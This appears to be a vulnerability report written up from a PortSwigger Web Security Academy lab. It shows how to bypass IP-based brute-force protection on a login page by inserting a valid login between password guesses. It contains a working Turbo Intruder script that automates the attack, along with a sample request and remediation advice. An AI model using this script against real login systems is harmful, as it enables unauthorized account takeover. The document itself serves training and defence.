# Vulnerability Report: Account Takeover via Broken Brute-Force Protection Bypass

**Severity:** High  
**CVSS Score:** 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)  
**Date:** 2026-07-31  
**Target:** TARGET.web-security-academy.net  

## Executive Summary
A broken brute-force protection vulnerability was identified in the login functionality of the application.
The application enforces a limit of three consecutive failed login attempts per IP address, but resets the counter upon any successful login.
An attacker with one valid account can exploit this by interleaving legitimate logins between attack attempts,
bypassing the protection entirely and brute-forcing any other account on the platform without triggering a lockout.

## Vulnerability Details
| Field | Value |
|-------|-------|
| Type | Broken Brute-Force Protection — Consecutive Counter Bypass |
| Endpoint | `POST /login` |
| Method | POST |
| Protection | IP-based, 3 consecutive failed attempts |
| Bypass | Interleaving valid credentials resets the failure counter |
| Requirement | One valid account on the platform |
| User Interaction | Not required |

## Steps to Reproduce
1. Log in with valid credentials (`wiener:peter`) and confirm a `302` redirect on success.
2. Send the login request to Burp Repeater — confirm that three consecutive failed attempts trigger rate limiting.
3. Confirm the bypass: send two failed attempts for `carlos`, then one valid login as `wiener`, then repeat — observe that the protection never triggers.
4. Copy the password list provided by the lab into a local file.
5. Send the login request to Turbo Intruder and set placeholders for `username` and `password`.
6. Use the following script to interleave valid credentials every two attack attempts:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, requestsPerConnection=100, pipeline=False, engine=Engine.THREADED)

    with open('/path/to/wordlist', 'r') as pf:
        for i, password in enumerate(pf.readlines()):
            if i % 2 == 0:
                engine.queue(target.req, ['wiener', 'peter'])
            engine.queue(target.req, ['carlos', password.rstrip()])

def handleResponse(req, interesting):
    if '302' in req.response:
        table.add(req)
```

7. Filter output for `302` responses — the matching entry reveals Carlos's password.
8. Log in with the found credentials — account takeover confirmed.

## Proof of Concept
```http
POST /login HTTP/2
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=carlos&password=<brute-forced password>
```

## Impact
An attacker with any valid account on the platform can brute-force any other account given a password list.
No victim interaction is required. This can lead to:
- Full account takeover of any user on the platform
- Access to all personal data and functionality tied to the compromised account
- Potential privilege escalation if any targeted account holds an elevated role

## Remediation
- Track failed attempts cumulatively over a time window — a successful login in between must not reset the counter
- Enforce per-account lockout independently of IP, requiring email confirmation or admin action to unlock
- Do not rely solely on IP-based protection — it is bypassable via proxies, IP rotation, or as shown here, a legitimate account
- Add CAPTCHA after a threshold of failed attempts to prevent automated attacks
- Enforce a strong password policy to reduce the effectiveness of wordlist-based attacks

## References
- OWASP: Broken Authentication
- CWE-307: Improper Restriction of Excessive Authentication Attempts
- PortSwigger: Broken brute-force protection, IP block